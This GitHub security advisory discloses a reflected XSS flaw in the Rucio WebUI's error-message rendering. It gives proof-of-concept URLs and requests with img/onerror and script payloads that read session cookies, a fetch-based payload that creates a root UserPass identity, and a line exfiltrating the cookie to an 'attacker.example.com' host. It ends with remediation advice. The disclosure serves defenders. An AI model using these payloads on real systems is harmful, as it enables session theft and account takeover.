# Rucio WebUI has a Reflected Cross-site Scripting Vulnerability

**GHSA**: GHSA-h79m-5jjm-jm4q | **CVE**: CVE-2026-25136 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-79, CWE-1004

**Affected Packages**:
- **rucio-webui** (pip): < 35.8.3
- **rucio-webui** (pip): >= 36.0.0rc1, < 38.5.4
- **rucio-webui** (pip): >= 39.0.0rc1, < 39.3.1

## Description

### Summary
A reflected Cross-site Scripting vulnerability was located in the rendering of the ExceptionMessage of the WebUI 500 error which could allow attackers to steal login session tokens of users who navigate to a specially crafted URL.

#### Details
The WebUI error message renders `ExceptionMessage` (which can contain user-controlled input) as unencoded HTML. Server code that produces the message is in `common.py` - specifically `error_headers -> _error_response -> generate_http_error_flask`, which places `ExceptionMessage` into both response headers and the JSON body. The WebUI client then injects that text into the DOM using unsafe methods (examples in `lib/rucio/web/ui/static/*.js` such as `rule.js`, `request_rule.js`, `list_rules.js`) with `jQuery.html(...)` or equivalent, enabling reflected XSS when an attacker-controlled value is included in an error message (e.g. account, attribute, scope).

### PoC
1) Reflected XSS via account parameter (browse or load URL in WebUI context):
```text
https://127.0.0.1:8443/ui/account_rse_usage?account=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```
Server response (excerpt):
```http
HTTP/1.1 500 INTERNAL SERVER ERROR
ExceptionClass: AccountNotFound
ExceptionMessage: Account <img src=x onerror=alert(document.cookie)> does not exist
Content-Type: application/octet-stream

{"ExceptionClass":"AccountNotFound","ExceptionMessage":"Account <img src=x onerror=alert(document.cookie)> does not exist"}
```

**XSS payload triggering (Displaying session token) when browsing to crafted URL**
<img width="1210" height="510" alt="XSS payload triggering (Displaying session token) when browsing to crafted URL" src="https://github.com/user-attachments/assets/989a0aed-628d-4f1c-bbfb-de434dab8af6" />

When the WebUI inserts `ExceptionMessage` into the page with `.html(...)`, the injected <img onerror=...> executes and displays the users' session tokens. Note that this is a PoC only, an attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).

2) Reflected XSS via account key attribute creation error:
```http
POST /proxy/accounts/pentest/attr/XSS HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Origin: https://127.0.0.1:8443
X-Rucio-Script: webui::-ui-account
{"key":"XSS","value":"<script>alert(document.cookie)</script>"}
```

**XSS payload triggering (Displaying session token) on error when creating account key**
<img width="1322" height="593" alt="XSS payload triggering (Displaying session token) on error when creating account key" src="https://github.com/user-attachments/assets/151cb0ad-e4f0-498e-954e-be3455ca8a72" />

Server response (excerpt) contains `ExceptionMessage` with the raw `<script>` payload; the WebUI renders it unsafely and script executes. Note that this method is less impactful since it's not something that can be triggered with a URL alone, but is listed to show that this issue affects multiple locations.

### Impact
Any authenticated WebUI user who follows a crafted link or triggers a request containing attacker-controlled input in a field that causes an error may execute arbitrary JavaScript in the WebUI origin. This vulnerability is more impactful due to the lack of protection of cookies (The Session token does not have HttpOnly attribute) and lack of Content Security Policy that would prevent thrid-party scripts from loading.

Attackers can steal session cookies/tokens or perform actions as the victim like creating a new UserPass identity with an attacker known password. 

**Example URL to Create UserPass for Root**
```
https://localhost:8443/ui/account_rse_usage?account=%3Cimg%20src%3Dx%20onerror%3D(function()%7Bo%3D%7B%7D%3Bo.method%3D'PUT'%3Bo.credentials%3D'include'%3Bo.headers%3D%7B'X-Rucio-Username'%3A'attackeruser'%2C'X-Rucio-Password'%3A'AttackerPassword123'%2C'X-Rucio-Email'%3A'demo%40example.org'%2C'X-Rucio-Auth-Token'%3Atoken%7D%3Bfetch(String.fromCharCode(47)%2B'identities'%2BString.fromCharCode(47)%2B'root'%2BString.fromCharCode(47)%2B'userpass'%2Co)%7D)()%3E
```

**Account Payload to Create UserPass**
```html
<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>
```

**Creating identity for Root account via reflected XSS**
<img width="1558" height="957" alt="Creating identity for Root account via reflected XSS" src="https://github.com/user-attachments/assets/539bfff4-70f3-42c5-b83a-10b5f85d6d44" />

All WebUI users are impacted.

### Remediation / Mitigation
Change all client-side insertions of server-provided text from `.html(...)` to `.text()` or create text nodes / escape HTML before insertion. Example: replace `$('#elem').html(msg)` with `$('#elem').empty().append($('<span>').text(msg))`.

Additionally, consider adding a Content Security Policy (CSP) to mitigate external script execution and set the HTTPOnly flag for session cookies. Also, the API token should not be set in a JavaScript variable as it can be accessed by an attacker even with the HTTPOnly flag set on the session cookie.

> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = "root-root-webui-...:"` (See `/ui/list_accounts` for example)

#### References:
- Server functions: `common.py` (`error_headers`, `_error_response, generate_http_error_flask`)
- Example client files to fix: `lib/rucio/web/ui/static/rule.js`, `lib/rucio/web/ui/static/request_rule.js, list_rules.js`
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
